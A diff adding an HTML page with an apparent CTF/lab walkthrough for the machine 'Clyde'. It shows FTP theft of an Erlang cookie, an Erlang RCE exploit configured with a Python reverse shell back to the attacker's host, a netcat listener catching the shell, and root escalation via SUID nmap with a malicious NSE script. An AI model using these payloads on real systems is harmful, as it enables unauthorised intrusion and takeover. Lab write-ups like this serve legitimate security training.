@@ -1,0 +1,188 @@
+<div id="__BVID__12___BV_modal_content_" tabindex="-1" class="modal-content"><header id="__BVID__12___BV_modal_header_" class="modal-header"><h5 id="__BVID__12___BV_modal_title_" class="modal-title">Walkthrough</h5><button type="button" aria-label="Close" class="close">×</button></header><div id="__BVID__12___BV_modal_body_" class="modal-body"><div class="mb-2 flex-grow" on-finish="function() {
+    [native code]
+}"><div class="markdown-container"><div class="markdown-content text-black"><!----><div><h1>Exploitation Guide for Clyde</h1>
+<h2>Summary</h2>
+<p>We'll exploit this machine by feeding a leaked Erlang cookie (found on an anonymous FTP) into a remote code execution exploit against the Erlang Port Mapper Daemon. We'll then escalate by leveraging misconfigured SUID permissions on the <strong>nmap</strong> binary and a malicious NSE script, meaning we'll use Nmap for both enumeration and escalation!</p>
+<h2>Enumeration</h2>
+<h3>Nmap</h3>
+<p>We begin with a full <code>nmap</code> TCP port scan.</p>
+<pre id="fence-code-1" class="fence-code"><code>kali@kali:~$ sudo nmap -p- 192.168.120.107
+Completed SYN Stealth Scan at 05:35, 353.11s elapsed (65535 total ports)
+Nmap scan report for 192.168.120.107
+Host is up (0.28s latency).
+Not shown: 65517 filtered ports
+PORT      STATE  SERVICE
+21/tcp    open   ftp
+22/tcp    open   ssh
+53/tcp    closed domain
+80/tcp    open   http
+4369/tcp  open   epmd
+15672/tcp open   unknown
+40000/tcp closed safetynetp
+40001/tcp closed unknown
+40002/tcp closed unknown
+40003/tcp closed unknown
+40004/tcp closed unknown
+40005/tcp closed unknown
+40006/tcp closed unknown
+40007/tcp closed unknown
+40008/tcp closed unknown
+40009/tcp closed unknown
+40010/tcp closed unknown
+65000/tcp open   unknown
+</code></pre>
+<p>Next, we'll run an aggressive scan against port 4369.</p>
+<pre id="fence-code-2" class="fence-code"><code>kali@kali:~$ sudo nmap -p 4369 -A  192.168.120.107
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 17:10 AWST
+Nmap scan report for rabbitmq (192.168.120.107)
+Host is up (0.28s latency).
+
+PORT     STATE SERVICE VERSION
+4369/tcp open  epmd    Erlang Port Mapper Daemon
+| epmd-info: 
+|   epmd_port: 4369
+|   nodes: 
+|_    rabbit: 65000
+...
+</code></pre>
+<p>This scan identifies port 4369 as the <em>Erlang Port Mapper Daemon</em>. It also identifies a connected RabbitMQ node on port 65000. We will note this information for future reference.</p>
+<h3>Anonymous FTP</h3>
+<p>Anonymous authentication is enabled on the FTP server, and we are able to log in as <code>anonymous:anonymous</code>. Let's log in and then enable Passive FTP mode.</p>
+<pre id="fence-code-3" class="fence-code"><code>kali@kali:~$ ftp 192.168.120.107                             
+Connected to 192.168.120.107.
+220 (vsFTPd 3.0.3)
+Name (192.168.120.107:kali): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; passive
+Passive mode on.
+ftp&gt;
+</code></pre>
+<p>Listing the contents of the root directory, we find the <strong>rabbitmq</strong> directory.</p>
+<pre id="fence-code-4" class="fence-code"><code>ftp&gt; ls
+227 Entering Passive Mode (192,168,120,107,156,65).
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Apr 24  2020 PackageKit
+drwxr-xr-x    5 ftp      ftp          4096 Apr 24  2020 apache2
+drwxr-xr-x    5 ftp      ftp          4096 Jan 12 16:19 apt
+drwxr-xr-x    2 ftp      ftp          4096 Apr 22  2020 dbus
+drwxr-xr-x    2 ftp      ftp          4096 Apr 24  2020 dhcp
+drwxr-xr-x    8 ftp      ftp          4096 Jan 12 16:19 dpkg
+drwxr-xr-x    2 ftp      ftp          4096 Apr 20  2020 git
+drwxr-xr-x    2 ftp      ftp          4096 Apr 24  2020 initramfs-tools
+drwxr-xr-x    2 ftp      ftp          4096 May 07  2020 logrotate
+drwxr-xr-x    2 ftp      ftp          4096 Sep 08  2019 misc
+drwxr-xr-x    5 ftp      ftp          4096 Jan 12 16:19 mysql
+drwxr-xr-x    2 ftp      ftp          4096 Jul 13  2017 os-prober
+drwxr-xr-x    2 ftp      ftp          4096 Apr 24  2020 pam
+drwxr-xr-x    4 ftp      ftp          4096 Apr 24  2020 php
+drwx------    3 ftp      ftp          4096 Apr 24  2020 polkit-1
+drwxr-xr-x    2 ftp      ftp          4096 Apr 24  2020 python
+drwxr-xr-x    3 ftp      ftp          4096 May 08  2020 rabbitmq
+drwxr-xr-x    2 ftp      ftp          4096 Apr 24  2020 sgml-base
+drwxr-xr-x    6 ftp      ftp          4096 Apr 22  2020 systemd
+drwxr-xr-x    3 ftp      ftp          4096 Apr 30  2020 ucf
+drwxr-xr-x    3 ftp      ftp          4096 Apr 22  2020 vim
+drwxr-xr-x    3 ftp      ftp          4096 Apr 24  2020 vmware
+drwxr-xr-x    2 ftp      ftp          4096 Apr 24  2020 xml-core
+226 Directory send OK.
+</code></pre>
+<h2>Exploitation</h2>
+<h3>Retrieving Erlang Cookie</h3>
+<p>Let's navigate to the <strong>rabbitmq</strong> directory in FTP and list the contents.</p>
+<pre id="fence-code-5" class="fence-code"><code>ftp&gt; cd rabbitmq
+250 Directory successfully changed.
+ftp&gt; ls -la
+227 Entering Passive Mode (192,168,120,107,156,74).
+150 Here comes the directory listing.
+drwxr-xr-x    3 ftp      ftp          4096 May 08  2020 .
+drwxr-xr-x   25 ftp      ftp          4096 Apr 24  2020 ..
+-r--------    1 ftp      ftp            20 Apr 24  2020 .erlang.cookie
+drwxr-x---    6 ftp      ftp          4096 Jan 12 16:16 mnesia
+226 Directory send OK.
+</code></pre>
+<p>The <strong>.erlang.cookie</strong> file contains an Erlang cookie. Let's download it to our attack machine and inspect it.</p>
+<pre id="fence-code-6" class="fence-code"><code>ftp&gt; get .erlang.cookie
+local: .erlang.cookie remote: .erlang.cookie
+227 Entering Passive Mode (192,168,83,215,156,74).
+150 Opening BINARY mode data connection for .erlang.cookie (20 bytes).
+226 Transfer complete.
+20 bytes received in 0.00 secs (82.0641 kB/s)
+ftp&gt; bye
+221 Goodbye.
+</code></pre>
+<p>The cookie file contains the following:</p>
+<pre id="fence-code-7" class="fence-code"><code>kali@kali:~$ cat .erlang.cookie
+JPCGJCAEWHPKKPBXBYYB
+</code></pre>
+<h3>Erlang Remote Code Execution</h3>
+<p>We discover an <a href="https://www.exploit-db.com/exploits/49418" target="_blank">Erlang remote code execution exploit</a> that uses the cookie value we discovered. Let's download the Python exploit code to our attack machine.</p>
+<p>We'll update the exploit code with the following values, replacing the IP addresses as needed:</p>
+<pre id="fence-code-8" class="fence-code"><code>TARGET = "192.168.120.107"
+PORT = 65000
+COOKIE = "JPCGJCAEWHPKKPBXBYYB"
+CMD = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.118.6\",15672));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+</code></pre>
+<p>Let's start a Netcat listener on port 15672.</p>
+<pre id="fence-code-9" class="fence-code"><code>kali@kali:~$ nc -lvp 15672
+listening on [any] 15672 ...
+</code></pre>
+<p>We can now launch the exploit.</p>
+<pre id="fence-code-10" class="fence-code"><code>kali@kali:~$ python3 49418.py
+Extracted challenge 1814542648
+Authenticated, executing command
+Sending cmd: 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.118.6",15672));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+...
+</code></pre>
+<p>Our listener indicates that we caught a shell as <code>rabbitmq</code>.</p>
+<pre id="fence-code-11" class="fence-code"><code>kali@kali:~$ nc -lvp 15672
+listening on [any] 15672 ...
+connect to [192.168.118.6] from rabbitmq [192.168.120.107] 46820
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=107(rabbitmq) gid=112(rabbitmq) groups=112(rabbitmq)
+</code></pre>
+<h2>Escalation</h2>
+<h3>SUID Binary Enumeration</h3>
+<p>As we begin enumeration, we'll search for SUID binaries.</p>
+<pre id="fence-code-12" class="fence-code"><code>$ find / -user root -perm -4000 -exec ls -ldb {} \; 2&gt; /dev/null
+find / -user root -perm -4000 -exec ls -ldb {} \; 2&gt; /dev/null
+-rwsr-xr-x 1 root root 75792 May 17  2017 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 2838168 Dec 21  2016 /usr/bin/nmap
+-rwsr-xr-x 1 root root 40504 May 17  2017 /usr/bin/chsh
+-rwsr-xr-x 1 root root 40312 May 17  2017 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 23352 Dec  6  2018 /usr/bin/pkexec
+-rwsr-xr-x 1 root root 59680 May 17  2017 /usr/bin/passwd
+-rwsr-xr-x 1 root root 50040 May 17  2017 /usr/bin/chfn
+-rwsr-xr-- 1 root messagebus 42992 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 14856 Dec  6  2018 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 440728 Jul 15  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 61240 Nov 10  2016 /bin/ping
+-rwsr-xr-x 1 root root 44304 Mar  7  2018 /bin/mount
+-rwsr-xr-x 1 root root 31720 Mar  7  2018 /bin/umount
+-rwsr-xr-x 1 root root 30800 Aug 21  2018 /bin/fusermount
+-rwsr-xr-x 1 root root 40536 May 17  2017 /bin/su
+</code></pre>
+<p>Ironically, <strong>/usr/bin/nmap</strong> is in this list.</p>
+<h3>Nmap SUID Privilege Escalation</h3>
+<p>An online search reveals that we can spawn a shell with a malicious <code>nmap</code> NSE script. Since the binary is SUID, we should be able to spawn a root shell.</p>
+<pre id="fence-code-13" class="fence-code"><code>$ echo 'os.execute("/bin/sh")' &gt; /tmp/x.nse
+echo 'os.execute("/bin/sh")' &gt; /tmp/x.nse
+$ 
+$ nmap --script /tmp/x.nse
+nmap --script /tmp/x.nse
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2020-04-24 06:16 EDT
+WARNING: Running Nmap setuid, as you are doing, is a major security risk.
+
+id
+uid=108(rabbitmq) gid=112(rabbitmq) euid=0(root) groups=112(rabbitmq)
+</code></pre>
+<p>This works, and we were able to use <code>nmap</code> for both enumeration and escalation!</p>
+</div><!----></div></div><div class="d-flex flex-row full-width mt-4 mb-1 justify-content-end"><button type="button" class="btn transparent-btn mb-2 pl-0 pr-0 btn-link btn-lg">
+      Close
+    </button><!----></div></div></div><!----></div>
